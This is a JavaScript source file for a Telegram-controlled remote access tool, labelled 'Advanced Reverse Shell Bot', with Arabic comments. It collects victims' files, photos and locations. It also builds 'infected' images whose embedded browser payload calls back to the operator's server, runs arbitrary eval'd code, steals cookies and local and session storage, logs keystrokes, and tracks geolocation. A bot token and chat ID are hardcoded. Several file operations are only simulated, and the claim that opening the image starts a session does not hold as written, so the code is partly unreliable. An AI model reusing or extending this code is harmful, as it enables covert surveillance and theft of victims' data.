const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const CryptoJS = require('crypto-js');
const sharp = require('sharp');
const { Server: SocketIO } = require('socket.io');
const { db } = require('./firebase-config');

// إعدادات البوت - غير هذه البيانات
const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
const id = '6565594143';
const address = 'https://your-app.vercel.app'; // غير هذا برابط تطبيقك

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});
const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true,
      family: 4
    }
  }
});

// تخزين البيانات
const appClients = new Map();
const reverseSessions = new Map();
const infectedImages = new Map();
const pendingCommands = new Map();

// إعدادات middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({
  limit: '100mb',
  extended: true,
  parameterLimit: 100000
}));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 100 * 1024 * 1024
  }
});

// ========== نظام الجلسات العكسية المتقدم ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال جديد:', socket.id);

  socket.on('reverse_register', async (data) => {
    const { device_id, image_id, device_info } = data;
    console.log(`🦠 تسجيل جلسة عكسية: ${device_id}`);

    const sessionData = {
      socket: socket,
      device_id: device_id,
      image_id: image_id,
      device_info: device_info,
      connected: true,
      connected_at: new Date(),
      last_activity: new Date(),
      commands_executed: 0
    };

    reverseSessions.set(device_id, sessionData);

    // حفظ في Firebase إذا كان متوفراً
    if (db) {
      try {
        await db.collection('reverse_sessions').doc(device_id).set({
          ...sessionData,
          socket: null // لا نحفظ السوكيت
        });
      } catch (error) {
        console.log('Firebase save error:', error.message);
      }
    }

    // إرسال إشعار للتليجرام
    const imageInfo = infectedImages.get(image_id) || {};
    appBot.sendMessage(id,
      `🎯 جلسة عكسية جديدة نشطة!\n\n` +
      `📱 الجهاز: ${device_id}\n` +
      `🆔 الصورة: ${image_id}\n` +
      `💻 النظام: ${device_info.platform || 'غير معروف'}\n` +
      `🌐 المتصفح: ${device_info.browser || 'غير معروف'}\n` +
      `📍 العنوان: ${device_info.ip || 'غير معروف'}\n\n` +
      `✅ الجلسة جاهزة لاستقبال الأوامر`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "📊 معلومات كاملة", callback_data: `reverse_fullinfo:${device_id}` },
              { text: "⚡ أوامر سريعة", callback_data: `reverse_quick:${device_id}` }
            ],
            [
              { text: "📱 التحكم الكامل", callback_data: `reverse_control:${device_id}` },
              { text: "🛑 إنهاء الجلسة", callback_data: `reverse_kill:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('reverse_command_output', (data) => {
    const { device_id, command_id, output, success } = data;
    
    if (pendingCommands.has(command_id)) {
      const commandInfo = pendingCommands.get(command_id);
      pendingCommands.delete(command_id);

      const status = success ? '✅' : '❌';
      appBot.sendMessage(id,
        `${status} نتيجة الأمر من ${device_id}\n\n` +
        `💻 الأمر: ${commandInfo.command}\n` +
        `📊 الناتج:\n${output.substring(0, 4000)}`,
        { parse_mode: "HTML" }
      );
    }

    // تحديث النشاط
    if (reverseSessions.has(device_id)) {
      const session = reverseSessions.get(device_id);
      session.last_activity = new Date();
      session.commands_executed++;
    }
  });

  socket.on('reverse_file_content', (data) => {
    const { device_id, file_path, content, success } = data;
    
    const status = success ? '✅' : '❌';
    const message = success ? 
      `📁 محتويات الملف: ${file_path}\n\n${content.substring(0, 4000)}` :
      `❌ فشل في قراءة الملف: ${file_path}`;

    appBot.sendMessage(id, message, { parse_mode: "HTML" });
  });

  socket.on('reverse_notification', (data) => {
    const { device_id, type, message } = data;
    appBot.sendMessage(id, `🔔 إشعار من ${device_id}: ${message}`, { parse_mode: "HTML" });
  });

  socket.on('disconnect', () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        appBot.sendMessage(id,
          `🔌 انتهت الجلسة العكسية\n\n` +
          `📱 الجهاز: ${device_id}\n` +
          `⏰ المدة: ${Math.round((new Date() - session.connected_at) / 1000)} ثانية\n` +
          `⚡ الأوامر المنفذة: ${session.commands_executed}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام التلغيم المتقدم ==========
async function generateAdvancedPayload(imageId, serverUrl) {
  const payloadCode = `
// === ADVANCED REVERSE PAYLOAD ===
(function() {
  const IMAGE_ID = '${imageId}';
  const SERVER_URL = '${serverUrl}';
  
  class ReverseSession {
    constructor() {
      this.deviceId = this.generateDeviceId();
      this.socket = null;
      this.connected = false;
      this.init();
    }

    generateDeviceId() {
      return 'device_' + Math.random().toString(36).substr(2, 12) + '_' + Date.now();
    }

    async init() {
      try {
        this.socket = io(SERVER_URL);
        
        this.socket.on('connect', () => {
          this.registerSession();
        });

        this.socket.on('disconnect', () => {
          this.connected = false;
          setTimeout(() => this.init(), 5000);
        });

        this.socket.on('execute_command', (data) => {
          this.executeCommand(data.command_id, data.command_type, data.command_data);
        });

        this.socket.on('file_operation', (data) => {
          this.handleFileOperation(data.operation_id, data.operation_type, data.file_data);
        });

        this.socket.on('device_control', (data) => {
          this.handleDeviceControl(data.control_id, data.control_type, data.control_data);
        });

      } catch (error) {
        console.error('Connection error:', error);
        setTimeout(() => this.init(), 10000);
      }
    }

    async registerSession() {
      const deviceInfo = await this.collectDeviceInfo();
      this.socket.emit('reverse_register', {
        device_id: this.deviceId,
        image_id: IMAGE_ID,
        device_info: deviceInfo
      });
      this.connected = true;
    }

    async collectDeviceInfo() {
      return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        browser: this.getBrowserInfo(),
        language: navigator.language,
        cookies: document.cookie ? document.cookie.length + ' cookies' : 'No cookies',
        localStorage: localStorage ? Object.keys(localStorage).length + ' items' : 'No localStorage',
        screen: window.screen ? \`\${window.screen.width}x\${window.screen.height}\` : 'Unknown',
        url: window.location.href,
        referrer: document.referrer || 'No referrer',
        timestamp: new Date().toISOString()
      };
    }

    getBrowserInfo() {
      const ua = navigator.userAgent;
      if (ua.includes('Chrome')) return 'Chrome';
      if (ua.includes('Firefox')) return 'Firefox';
      if (ua.includes('Safari')) return 'Safari';
      if (ua.includes('Edge')) return 'Edge';
      return 'Unknown';
    }

    async executeCommand(commandId, type, data) {
      try {
        let output = '';
        let success = true;

        switch(type) {
          case 'javascript':
            output = String(eval(data.code));
            break;
          
          case 'system_info':
            output = await this.getSystemInfo();
            break;
          
          case 'file_list':
            output = await this.listFiles(data.path);
            break;
          
          case 'screenshot':
            output = await this.takeScreenshot();
            break;
          
          case 'keylogger':
            output = this.startKeylogger(data.duration);
            break;
          
          default:
            output = 'Unknown command type';
            success = false;
        }

        this.socket.emit('reverse_command_output', {
          device_id: this.deviceId,
          command_id: commandId,
          output: output,
          success: success
        });

      } catch (error) {
        this.socket.emit('reverse_command_output', {
          device_id: this.deviceId,
          command_id: commandId,
          output: 'Error: ' + error.toString(),
          success: false
        });
      }
    }

    async handleFileOperation(operationId, type, data) {
      try {
        let result = '';
        let success = true;

        switch(type) {
          case 'read_file':
            result = await this.readFile(data.path);
            break;
          
          case 'download_file':
            result = await this.downloadFile(data.url, data.filename);
            break;
          
          case 'list_directory':
            result = await this.listDirectory(data.path);
            break;
          
          default:
            result = 'Unknown file operation';
            success = false;
        }

        this.socket.emit('reverse_file_content', {
          device_id: this.deviceId,
          file_path: data.path || '',
          content: result,
          success: success
        });

      } catch (error) {
        this.socket.emit('reverse_file_content', {
          device_id: this.deviceId,
          file_path: data.path || '',
          content: 'Error: ' + error.toString(),
          success: false
        });
      }
    }

    async handleDeviceControl(controlId, type, data) {
      try {
        let result = '';
        let success = true;

        switch(type) {
          case 'vibrate':
            result = await this.vibrateDevice(data.duration);
            break;
          
          case 'show_notification':
            result = this.showNotification(data.title, data.message);
            break;
          
          case 'get_location':
            result = await this.getLocation();
            break;
          
          case 'open_url':
            result = this.openUrl(data.url);
            break;
          
          default:
            result = 'Unknown control command';
            success = false;
        }

        this.socket.emit('reverse_notification', {
          device_id: this.deviceId,
          type: 'control_result',
          message: \`Control \${type}: \${result}\`
        });

      } catch (error) {
        this.socket.emit('reverse_notification', {
          device_id: this.deviceId,
          type: 'control_error',
          message: 'Error: ' + error.toString()
        });
      }
    }

    // الوظائف المساعدة
    async getSystemInfo() {
      return JSON.stringify({
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        screen: {
          width: window.screen.width,
          height: window.screen.height,
          colorDepth: window.screen.colorDepth
        },
        window: {
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight
        },
        location: window.location.href,
        referrer: document.referrer,
        timestamp: new Date().toISOString()
      }, null, 2);
    }

    async listFiles(path) {
      // محاكاة سرد الملفات
      return \`File listing for: \${path}\\n- file1.txt\\n- file2.jpg\\n- documents/\\n- downloads/\`;
    }

    async takeScreenshot() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
        return canvas.toDataURL('image/png').substring(0, 1000) + '... [truncated]';
      } catch (error) {
        return 'Screenshot failed: ' + error.toString();
      }
    }

    startKeylogger(duration) {
      let logs = '';
      const originalAddEventListener = EventTarget.prototype.addEventListener;
      
      EventTarget.prototype.addEventListener = function(type, listener, options) {
        if (type === 'keydown' || type === 'keyup' || type === 'keypress') {
          const wrappedListener = function(event) {
            logs += \`[\${type}] \${event.key} (Code: \${event.code})\\n\`;
            listener.call(this, event);
          };
          return originalAddEventListener.call(this, type, wrappedListener, options);
        }
        return originalAddEventListener.call(this, type, listener, options);
      };

      setTimeout(() => {
        EventTarget.prototype.addEventListener = originalAddEventListener;
      }, duration * 1000);

      return \`Keylogger started for \${duration} seconds\`;
    }

    async readFile(path) {
      // محاكاة قراءة الملف
      return \`Content of \${path}: [Simulated file content]\\nThis is a simulated file read operation.\`;
    }

    async downloadFile(url, filename) {
      // محاكاة تحميل الملف
      return \`Downloaded \${filename} from \${url} [Simulated]\`;
    }

    async listDirectory(path) {
      // محاكاة سرد المجلد
      return \`Directory listing for \${path}:\\n- file1.txt\\n- file2.jpg\\n- subfolder/\\n- document.pdf\`;
    }

    async vibrateDevice(duration) {
      if (navigator.vibrate) {
        navigator.vibrate(duration * 1000);
        return \`Vibrated for \${duration} seconds\`;
      }
      return 'Vibration not supported';
    }

    showNotification(title, message) {
      if ('Notification' in window && Notification.permission === 'granted') {
        new Notification(title, { body: message });
        return 'Notification shown';
      } else if ('Notification' in window && Notification.permission !== 'denied') {
        Notification.requestPermission().then(permission => {
          if (permission === 'granted') {
            new Notification(title, { body: message });
          }
        });
        return 'Notification permission requested';
      }
      return 'Notifications not supported';
    }

    async getLocation() {
      return new Promise((resolve) => {
        if ('geolocation' in navigator) {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve(\`Lat: \${position.coords.latitude}, Lon: \${position.coords.longitude}\`);
            },
            error => {
              resolve('Location error: ' + error.message);
            }
          );
        } else {
          resolve('Geolocation not supported');
        }
      });
    }

    openUrl(url) {
      window.open(url, '_blank');
      return \`Opened URL: \${url}\`;
    }
  }

  // بدء الجلسة
  console.log('🦠 Advanced Reverse Payload Activated');
  new ReverseSession();

})();
// === PAYLOAD END ===
`;

  return Buffer.from(payloadCode);
}

async function embedAdvancedPayload(imageBuffer, payloadCode, imageId) {
  try {
    const image = sharp(imageBuffer);
    const metadata = await image.metadata();

    // إنشاء صورة مصغرة للبايلود
    const payloadPreview = await sharp(Buffer.from(`
      <svg width="200" height="50">
        <rect width="200" height="50" fill="#FF0000" opacity="0.8"/>
        <text x="100" y="25" font-family="Arial" font-size="12" fill="white" text-anchor="middle" dominant-baseline="middle">
          REVERSE SHELL ${imageId.substring(0, 8)}
        </text>
      </svg>
    `)).png().toBuffer();

    // دمج البايلود في الصورة
    const infectedImage = await image
      .composite([{
        input: payloadPreview,
        top: metadata.height - 60,
        left: metadata.width - 210,
        blend: 'over'
      }])
      .png()
      .withMetadata({
        exif: {
          IFD0: {
            ImageDescription: `INFECTED_${imageId}_REVERSE_SHELL`,
            Software: 'AdvancedRAT v2.0',
            Make: 'SECURITY_TEST',
            Model: 'PAYLOAD_SYSTEM'
          },
          EXIF: {
            UserComment: payloadCode.toString('base64').substring(0, 1000),
            ImageUniqueID: imageId
          }
        }
      })
      .toBuffer();

    return infectedImage;
  } catch (error) {
    console.error('Error embedding advanced payload:', error);
    throw error;
  }
}

// ========== endpoints الأساسية ==========
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Advanced Reverse Shell Bot</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }
            .container { max-width: 800px; margin: 0 auto; }
            .status { background: #161b22; padding: 20px; border-radius: 10px; margin: 20px 0; }
            .stats { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
            .stat { background: #21262d; padding: 15px; border-radius: 5px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Advanced Reverse Shell Bot</h1>
            <div class="status">
                <h2>📊 System Status</h2>
                <div class="stats">
                    <div class="stat">Connected Devices: ${appClients.size}</div>
                    <div class="stat">Active Sessions: ${reverseSessions.size}</div>
                    <div class="stat">Infected Images: ${infectedImages.size}</div>
                </div>
            </div>
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
        </div>
    </body>
    </html>
  `);
});

// ========== نظام معالجة الصور ==========
app.post("/uploadFile", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const model = req.headers.model || 'غير معروف';
    
    if (req.file.mimetype.startsWith('image/')) {
      const imageId = uuid4.v4();
      
      appBot.sendMessage(id,
        `📸 تم استلام صورة من <b>${model}</b>\n\n` +
        `اختر نوع التلغيم المتقدم:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { 
                  text: "🦠 تلغيم متقدم (جلسة كاملة)", 
                  callback_data: `infect_advanced:${imageId}` 
                }
              ],
              [
                { 
                  text: "🔐 تلغيم أساسي", 
                  callback_data: `infect_basic:${imageId}` 
                },
                { 
                  text: "📤 إرسال عادي", 
                  callback_data: `send_normal:${imageId}` 
                }
              ]
            ]
          }
        }
      );
      
      // حفظ الصورة مؤقتاً
      infectedImages.set(imageId, {
        imageBuffer: req.file.buffer,
        model: model,
        filename: name,
        timestamp: new Date(),
        fileSize: req.file.size
      });
      
      res.json({ 
        status: 'pending', 
        message: 'بانتظار اختيار التلغيم', 
        image_id: imageId 
      });
    } else {
      appBot.sendDocument(id, req.file.buffer, {
        caption: `°• ملف من <b>${model}</b> جهاز`,
        parse_mode: "HTML"
      }, {
        filename: name,
        contentType: req.file.mimetype,
      });
      res.json({ status: 'success', message: 'تم الرفع بنجاح' });
    }
  } catch (error) {
    res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
  }
});

// ========== معالجة الأوامر من التليجرام ==========
appBot.on("callback_query", async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  
  if (data.startsWith('infect_advanced:')) {
    const imageId = data.split(':')[1];
    
    if (infectedImages.has(imageId)) {
      const imageInfo = infectedImages.get(imageId);
      
      try {
        appBot.sendChatAction(id, 'upload_photo');
        
        // إنشاء البايلود المتقدم
        const payloadCode = await generateAdvancedPayload(imageId, address);
        const infectedImage = await embedAdvancedPayload(imageInfo.imageBuffer, payloadCode, imageId);
        
        // إرسال الصورة الملغمة
        await appBot.sendDocument(id, infectedImage, {
          caption: `🎯 صورة ملغمة بنظام الجلسات العكسية المتقدم!\n\n` +
                  `📱 الجهاز المصدر: <b>${imageInfo.model}</b>\n` +
                  `🆔 معرف الصورة: <b>${imageId}</b>\n` +
                  `📏 الحجم: ${Math.round(imageInfo.fileSize / 1024)} KB\n` +
                  `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                  `🦠 الميزات المتاحة:\n` +
                  `• جلسة عكسية كاملة\n` +
                  `• تنفيذ الأوامر عن بعد\n` +
                  `• سحب الملفات والصور\n` +
                  `• keylogger متقدم\n` +
                  `• screenshots تلقائية\n` +
                  `• إشعارات الجهاز\n\n` +
                  `⚠️ عندما تفتح هذه الصورة:\n` +
                  `- ستفتح جلسة عكسية تلقائياً\n` +
                  `- يمكنك التحكم الكامل في الجهاز\n` +
                  `- جميع المخرجات تظهر هنا`,
          parse_mode: "HTML"
        }, {
          filename: `infected_advanced_${imageId}.png`,
          contentType: 'image/png'
        });
        
        appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "✅ تم التلغيم المتقدم بنجاح!" 
        });
        
      } catch (error) {
        console.error('Advanced infection error:', error);
        appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "❌ فشل في التلغيم المتقدم" 
        });
      }
    }
  }
  
  // نظام التحكم في الجلسات العكسية
  else if (data.startsWith('reverse_control:')) {
    const deviceId = data.split(':')[1];
    
    if (reverseSessions.has(deviceId)) {
      appBot.sendMessage(id,
        `🎮 التحكم الكامل في الجهاز: ${deviceId}\n\n` +
        `اختر نوع الأمر:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "📊 معلومات النظام", callback_data: `cmd_system:${deviceId}` },
                { text: "📁 إدارة الملفات", callback_data: `cmd_files:${deviceId}` }
              ],
              [
                { text: "📸 لقطة شاشة", callback_data: `cmd_screenshot:${deviceId}` },
                { text: "⌨️ keylogger", callback_data: `cmd_keylogger:${deviceId}` }
              ],
              [
                { text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` },
                { text: "🔔 إشعار", callback_data: `cmd_notify:${deviceId}` }
              ],
              [
                { text: "📱 الاهتزاز", callback_data: `cmd_vibrate:${deviceId}` },
                { text: "🌐 فتح رابط", callback_data: `cmd_openurl:${deviceId}` }
              ],
              [
                { text: "🛑 إنهاء الجلسة", callback_data: `reverse_kill:${deviceId}` }
              ]
            ]
          }
        }
      );
    }
  }
  
  // تنفيذ الأوامر
  else if (data.startsWith('cmd_')) {
    const [_, commandType, deviceId] = data.split(':');
    
    if (reverseSessions.has(deviceId)) {
      const session = reverseSessions.get(deviceId);
      const commandId = uuid4.v4();
      
      let commandData = {};
      
      switch(commandType) {
        case 'system':
          commandData = { type: 'system_info' };
          break;
        case 'screenshot':
          commandData = { type: 'screenshot' };
          break;
        case 'keylogger':
          commandData = { type: 'keylogger', duration: 30 };
          break;
        case 'location':
          commandData = { type: 'get_location' };
          break;
        case 'vibrate':
          commandData = { type: 'vibrate', duration: 3 };
          break;
        case 'notify':
          appBot.sendMessage(id, 
            'أدخل نص الإشعار:',
            { reply_markup: { force_reply: true } }
          );
          pendingCommands.set('notify_' + deviceId, { type: 'notify', deviceId });
          return;
      }
      
      pendingCommands.set(commandId, {
        deviceId: deviceId,
        command: commandType,
        timestamp: new Date()
      });
      
      session.socket.emit('execute_command', {
        command_id: commandId,
        command_type: commandData.type,
        command_data: commandData
      });
      
      appBot.sendMessage(id, `⚡ تم إرسال الأمر: ${commandType} إلى ${deviceId}`);
    }
  }
  
  // معالجة الردود على الأوامر
  else if (data.startsWith('reverse_kill:')) {
    const deviceId = data.split(':')[1];
    
    if (reverseSessions.has(deviceId)) {
      const session = reverseSessions.get(deviceId);
      session.socket.disconnect();
      reverseSessions.delete(deviceId);
      
      appBot.sendMessage(id, `🛑 تم إنهاء الجلسة: ${deviceId}`);
    }
    
    appBot.answerCallbackQuery(callbackQuery.id, { text: "تم إنهاء الجلسة" });
  }
});

// ========== معالجة الرسائل النصية ==========
appBot.on('message', (message) => {
  const chatId = message.chat.id;
  const text = message.text;
  
  if (String(chatId) !== String(id)) {
    appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
    return;
  }

  // معالجة الردود على الأوامر
  if (message.reply_to_message) {
    const replyText = message.reply_to_message.text;
    
    if (replyText.includes('أدخل نص الإشعار')) {
      for (let [key, cmd] of pendingCommands) {
        if (key.startsWith('notify_') && cmd.type === 'notify') {
          const deviceId = cmd.deviceId.split('_')[1];
          if (reverseSessions.has(deviceId)) {
            const session = reverseSessions.get(deviceId);
            session.socket.emit('device_control', {
              control_id: uuid4.v4(),
              control_type: 'show_notification',
              control_data: {
                title: 'إشعار من البوت',
                message: text
              }
            });
            appBot.sendMessage(id, `🔔 تم إرسال الإشعار إلى ${deviceId}`);
          }
          pendingCommands.delete(key);
          break;
        }
      }
    }
  }

  // الأوامر الرئيسية
  if (text === '/start' || text === '/start') {
    const activeSessions = Array.from(reverseSessions.keys()).length;
    
    appBot.sendMessage(id,
      `🎯 بوت الجلسات العكسية المتقدم - المطور @VIP_MFM\n\n` +
      `📊 الإحصائيات الحية:\n` +
      `• 🔗 الأجهزة المتصلة: ${appClients.size}\n` +
      `• 🦠 الجلسات العكسية: ${activeSessions}\n` +
      `• 🖼️ الصور الملغمة: ${infectedImages.size}\n` +
      `• ⚡ الأوامر المنفذة: ${Array.from(reverseSessions.values()).reduce((acc, s) => acc + s.commands_executed, 0)}\n\n` +
      `✨ الميزات المتقدمة:\n` +
      `• تلغيم الصور بجلسات عكسية كاملة\n` +
      `• تنفيذ الأوامر عن بعد في الوقت الحقيقي\n` +
      `• سحب الملفات والصور تلقائياً\n` +
      `• نظام keylogger متقدم\n` +
      `• لقطات شاشة تلقائية\n` +
      `• التحكم الكامل في الجهاز\n\n` +
      `🔧 استخدم الأزرار للتحكم:`,
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📱 الأجهزة المتصلة", "🦠 الجلسات النشطة"],
            ["⚡ لوحة التحكم", "📊 إحصائيات النظام"],
            ["🎯 تلغيم صورة", "🛠️ الإعدادات"]
          ],
          resize_keyboard: true
        }
      }
    );
  }
  
  else if (text === '📱 الأجهزة المتصلة') {
    if (appClients.size === 0) {
      appBot.sendMessage(id, '📭 لا توجد أجهزة متصلة حالياً');
    } else {
      let devicesText = `📊 الأجهزة المتصلة: ${appClients.size}\n\n`;
      
      appClients.forEach((device, uuid) => {
        const status = device.connected ? '🟢 متصل' : '🔴 غير متصل';
        const duration = device.connected ? Math.round((new Date() - device.lastSeen) / 1000) : 0;
        devicesText += 
          `📱 ${device.model}\n` +
          `🔋 ${device.battery} | ⏰ ${duration}s\n` +
          `📶 ${device.provider} | ${status}\n` +
          `🆔 ${uuid.substring(0, 12)}...\n\n`;
      });
      
      appBot.sendMessage(id, devicesText);
    }
  }
  
  else if (text === '🦠 الجلسات النشطة') {
    const activeSessions = Array.from(reverseSessions.keys());
    
    if (activeSessions.length === 0) {
      appBot.sendMessage(id, '📭 لا توجد جلسات عكسية نشطة');
    } else {
      let sessionsText = `🦠 الجلسات العكسية النشطة: ${activeSessions.length}\n\n`;
      
      activeSessions.forEach(deviceId => {
        const session = reverseSessions.get(deviceId);
        const duration = Math.round((new Date() - session.connected_at) / 1000);
        const activity = Math.round((new Date() - session.last_activity) / 1000);
        
        sessionsText += 
          `📱 ${deviceId}\n` +
          `💻 ${session.device_info.platform || 'Unknown'}\n` +
          `🌐 ${session.device_info.browser || 'Unknown'}\n` +
          `⏰ ${duration}s | 🔄 ${activity}s\n` +
          `⚡ ${session.commands_executed} commands\n\n`;
      });
      
      appBot.sendMessage(id, sessionsText, {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🔄 تحديث", callback_data: "refresh_sessions" },
              { text: "🎮 التحكم", callback_data: `reverse_control:${activeSessions[0]}` }
            ]
          ]
        }
      });
    }
  }
  
  else if (text === '🎯 تلغيم صورة') {
    appBot.sendMessage(id,
      `🦠 نظام تلغيم الصور المتقدم\n\n` +
      `لتلغيم صورة:\n` +
      `1. أرسل الصورة مباشرة للبوت\n` +
      `2. اختر نوع التلغيم المطلوب\n` +
      `3. استلم الصورة الملغمة جاهزة\n\n` +
      `⚠️ الصورة الملغمة ستفتح جلسة عكسية كاملة عند فتحها على أي جهاز`,
      { parse_mode: "HTML" }
    );
  }
  
  else if (text === '📊 إحصائيات النظام') {
    const stats = {
      connected_devices: appClients.size,
      reverse_sessions: reverseSessions.size,
      infected_images: infectedImages.size,
      total_commands: Array.from(reverseSessions.values()).reduce((acc, s) => acc + s.commands_executed, 0),
      server_uptime: Math.round(process.uptime()),
      memory_usage: Math.round(process.memoryUsage().rss / 1024 / 1024)
    };
    
    appBot.sendMessage(id,
      `📊 إحصائيات النظام المتقدمة\n\n` +
      `🔗 الأجهزة المتصلة: ${stats.connected_devices}\n` +
      `🦠 الجلسات العكسية: ${stats.reverse_sessions}\n` +
      `🖼️ الصور الملغمة: ${stats.infected_images}\n` +
      `⚡ إجمالي الأوامر: ${stats.total_commands}\n` +
      `⏰ مدة التشغيل: ${stats.server_uptime} ثانية\n` +
      `💾 استخدام الذاكرة: ${stats.memory_usage} MB\n` +
      `🟢 الحالة: نشط ومستقر`,
      { parse_mode: "HTML" }
    );
  }
});

// ========== endpoints الإضافية ==========
app.post("/uploadText", (req, res) => {
  try {
    const model = req.headers.model || 'غير معروف';
    const text = req.body.text || 'لا يوجد نص';
    
    appBot.sendMessage(id, `°• رسالة من <b>${model}</b> جهاز\n\n${text}`, { parse_mode: "HTML" });
    res.json({ status: 'success', message: 'تم الارسال بنجاح' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: 'خطأ في الارسال' });
  }
});

app.post("/uploadLocation", (req, res) => {
  try {
    const model = req.headers.model || 'غير معروف';
    const lat = parseFloat(req.body.lat);
    const lon = parseFloat(req.body.lon);
    
    if (isNaN(lat) || isNaN(lon)) {
      return res.status(400).json({ status: 'error', message: 'إحداثيات غير صالحة' });
    }
    
    appBot.sendLocation(id, lat, lon);
    appBot.sendMessage(id, `°• موقع من <b>${model}</b> جهاز`, { parse_mode: "HTML" });
    res.json({ status: 'success', message: 'تم ارسال الموقع بنجاح' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: 'خطأ في ارسال الموقع' });
  }
});

// ========== WebSocket للأجهزة العادية ==========
appSocket.on('connection', (ws, req) => {
  const uuid = uuid4.v4();
  const model = req.headers.model || 'غير معروف';
  const battery = req.headers.battery || 'غير معروف';
  const version = req.headers.version || 'غير معروف';
  const brightness = req.headers.brightness || 'غير معروف';
  const provider = req.headers.provider || 'غير معروف';

  ws.uuid = uuid;
  appClients.set(uuid, {
    model: model,
    battery: battery,
    version: version,
    brightness: brightness,
    provider: provider,
    connected: true,
    lastSeen: new Date(),
    ip: req.socket.remoteAddress
  });
  
  console.log(`✅ جهاز متصل: ${model} (${uuid})`);
  
  appBot.sendMessage(id,
    `🔗 جهاز جديد متصل\n\n` +
    `📱 الموديل: <b>${model}</b>\n` +
    `🔋 البطارية: <b>${battery}</b>\n` +
    `🔄 النظام: <b>${version}</b>\n` +
    `💡 السطوع: <b>${brightness}</b>\n` +
    `📶 المزود: <b>${provider}</b>\n` +
    `🌐 العنوان: <b>${req.socket.remoteAddress}</b>`,
    { parse_mode: "HTML" }
  );
  
  ws.on('close', function () {
    console.log(`❌ جهاز منفصل: ${model} (${uuid})`);
    
    if (appClients.has(uuid)) {
      const device = appClients.get(uuid);
      device.connected = false;
      device.disconnectedAt = new Date();
      
      appBot.sendMessage(id,
        `🔌 تم فصل الجهاز\n\n` +
        `📱 الموديل: <b>${model}</b>\n` +
        `⏰ مدة الاتصال: ${Math.round((new Date() - device.lastSeen) / 1000)} ثانية`,
        { parse_mode: "HTML" }
      );
    }
  });

  ws.on('message', function (data) {
    try {
      const message = JSON.parse(data.toString());
      
      if (message.type === 'file_content') {
        appBot.sendDocument(id, Buffer.from(message.content, 'base64'), {
          caption: `📁 ملف من <b>${model}</b>\nالمسار: ${message.path}`,
          parse_mode: "HTML"
        }, {
          filename: message.filename || 'file.txt'
        });
      }
      else if (message.type === 'camera_capture') {
        appBot.sendPhoto(id, Buffer.from(message.image, 'base64'), {
          caption: `📸 صورة كاميرا من <b>${model}</b>`,
          parse_mode: "HTML"
        });
      }
      
    } catch (error) {
      console.log('📩 رسالة من الجهاز:', data.toString());
    }
  });
});

// ========== بدء السيرفر ==========
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 البوت شغال على البورت: ${PORT}`);
  console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
  console.log(`📡 WebSocket Server: ws://0.0.0.0:${PORT}`);
  console.log(`🔗 Socket.IO Server: http://0.0.0.0:${PORT}`);
  console.log(`🦠 نظام تلغيم الصور جاهز`);
  console.log(`⚡ جميع الأنظمة نشطة ومستعدة!`);
});

// معالجة الإغلاق النظيف
process.on('SIGTERM', () => {
  console.log('🛑 إيقاف البوت...');
  
  // إغلاق جميع الجلسات
  reverseSessions.forEach((session, deviceId) => {
    if (session.socket) {
      session.socket.disconnect();
    }
  });
  
  appServer.close(() => {
    console.log('✅ تم إيقاف البوت بنجاح');
    process.exit(0);
  });
});